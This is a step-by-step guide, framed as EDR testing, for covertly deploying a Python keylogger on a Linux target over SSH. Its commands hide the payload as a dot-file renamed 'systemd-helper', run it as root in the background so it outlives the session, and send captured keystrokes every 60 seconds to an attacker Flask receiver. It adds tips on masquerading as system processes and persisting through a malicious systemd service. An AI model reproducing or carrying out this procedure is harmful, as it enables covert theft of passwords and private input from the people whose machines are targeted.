# Keylogger Deployment and Exfiltration Guide

> **Prerequisite:** Before proceeding with this deployment, you must have already successfully exploited, infiltrated, or otherwise gained initial access to the target machine. This guide assumes you currently possess an active remote shell (e.g., SSH) with the necessary privileges.

## Overview
This guide demonstrates how to deploy a keystroke logger onto a target machine via SSH, capture user inputs, and exfiltrate the logged keystrokes back to an attacker's machine. 

This test specifically validates how stealthily you can inject python-based input sniffers and test Endpoint Detection and Response (EDR) visibility on your network.

---

## 1. Setup on Attacker Machine

Before starting, ensure your receiver server (e.g., a Flask app listening for POST requests on `http://192.168.0.103:8080/exfil`) is running on your Attacker VM.

```bash
# Start your exfiltration receiver
python3 receiver.py
```

Ensure the target script is prepared on your machine as `keylogger.py`.

---

## 2. Transfer & Disguise

Use SCP to transfer the payload. To improve evasion, we place it in `/tmp` and prefix it with a dot to make it a hidden file.

```bash
# Transfer the script into the target machine
scp keylogger.py user@target-ip:/tmp/.keylogger.py
```

---

## 3. Execution on Target

SSH into the target machine and install the required low-level input libraries. 

```bash
ssh user@target-ip

# Install dependencies (requires python3-evdev for /dev/input capturing)
sudo apt update
sudo apt install python3-evdev python3-pip -y
pip3 install requests --user

# Disguise the script to fool casual process checks (Evasion)
mv /tmp/.keylogger.py /tmp/.systemd-helper.py
chmod +x /tmp/.systemd-helper.py
```

---

## 4. Run the Keylogger Cloaked

Keyloggers usually require `root` privileges to access the physical keyboard device files in Linux (`/dev/input/event*`).

To deploy it stealthily so it survives when you close your SSH session, use `nohup` and detach it to the background.

```bash
# Run stealthily in the background
sudo nohup python3 /tmp/.systemd-helper.py > /tmp/systemd-helper.out 2>&1 &

# Verify process is running
ps aux | grep systemd-helper
```

> **Note:** The keylogger will now capture key events and periodically send HTTP POST requests (every 60 seconds) containing the keystrokes back to your Attacker VM.

---

## 5. Verification & Monitoring

### On Attacker VM
Keep your Flask receiver running on your attacker machine. You will see output similar to this:
```bash
python3 receiver.py

HTTP C2 Receiver running on http://0.0.0.0:8080
 * Serving Flask app 'receiver'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8080
 * Running on http://192.168.0.103:8080
Press CTRL+C to quit
```
Watch this console output. As the target types on their keyboard, your Flask server should catch the incoming HTTP requests containing the logged data.

### On Target VM (Verification / Forensics)
- **Check Local File Dump**: 
  ```bash
  cat /tmp/.keylog.txt
  ```
- **Check Process Visibility (EDR Testing)**: 
  ```bash
  ps aux | grep python
  ```

---

## 6. Cleanup

Always clean up after authorized engagements.

```bash
# Terminate the keylogger process
sudo pkill -f .systemd-helper.py

# Remove artifacts
rm -f /tmp/.systemd-helper.py /tmp/.keylog.txt /tmp/systemd-helper.out
```

---

## ⚠️ Important EDR Testing Tips
- **Naming Conventions**: Never name your malicious scripts `keylogger.py`. Masquerade them as system files (e.g., `systemd-helper`, `kworker`).
- **Persistence**: For advanced testing, configure the keylogger to start via a malicious Systemd service, testing if the EDR detects unauthorized service creation.
- **Wayland vs X11**: Test how the keylogger manages input differences between display servers (X11 allows more global hooks, while Wayland aims to isolate inputs between processes).